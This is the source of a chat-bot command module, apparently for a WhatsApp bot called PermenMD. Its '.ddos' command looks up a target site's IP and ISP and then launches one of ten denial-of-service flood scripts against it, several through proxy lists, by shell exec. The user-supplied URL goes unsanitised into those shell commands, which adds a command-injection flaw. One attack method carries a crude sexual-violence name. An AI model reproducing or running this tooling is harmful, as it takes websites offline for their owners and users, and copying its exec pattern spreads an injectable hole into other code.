const fetch = require('node-fetch')
const axios = require('axios')
const { exec } = require('child_process');
const { promisify } = require('util');
const url = require('url')

const cooldowns = new Map();

const handler = async (m, { conn, command, args }) => {
  if (args.length < 3) return conn.reply(m.chat, '\`\`\`[🔎] .ddos [url] [duration] [methods]\`\`\`', m);

  const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com'];

  if (blacklistedDomains.some(domain => args[0].includes(domain))) {
    return conn.reply(m.chat, '❌ Blacklisted Target.', m);
  }

  const target = args[0]
  const duration = args[1]
  const methods = args[2]
  const parsedUrl = new url.URL(target);

  const hostname = parsedUrl.hostname;

  const path = parsedUrl.pathname;
  const thumb = global.attacking
  const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)

  const result = response.data;

  const deepinfo = `\`Hostname: ${hostname}\`
\`Path: ${path}\`
\`Isp: ${result.isp}\`
\`Ip: ${result.query}\`
\`AS: ${result.as}\``
  const details = `│ Creator: PermenMD
│ Target: ${target}
│ Methods: ${methods}
│ Duration: ${duration}
${deepinfo}`
  
if ( methods === 'tls' ) {
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXTls.js ${target} ${duration} 100 10`)
} else if ( methods === 'ninja' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXNinja.js ${target} ${duration}`)
} else if ( methods === 'https' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXHttps.js ${target} ${duration} 10 100 proxy.txt`)
} else if ( methods === 'mix' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXMix.js ${target} ${duration} 100 10 proxy.txt`)
} else if ( methods === 'kill' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXKill.js ${target} ${duration} 100 10`)
} else if ( methods === 'rape' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXRape.js ${target} 4 ${duration}`)
} else if ( methods === 'browsers' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXBrowsers.js ${target} ${duration} 10 100`)
} else if ( methods === 'bypass' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXBypass.js ${target} ${duration} 100 10 proxy.txt`)
} else if ( methods === 'raw' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXRaw.js ${target} ${duration}`)
} else if ( methods === 'strike' ) {     
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: false, 
title: `Attacking ${target}`,
body: `Mancing 500, 502, 503, CTO Wak`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: thumb,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./lib/PermenMD/StarsXStrike.js GET ${target} ${duration} 10 90 proxy.txt --full`)
} else {
	m.reply(`_*Unknown Methods*_`)
}
  }

handler.help = ['ddos'].map(v => v + ' <url> <duration>');
handler.tags = ['attack'];
handler.rowner = true
handler.owner = true
handler.command = /^(ddos)$/i;
module.exports = handler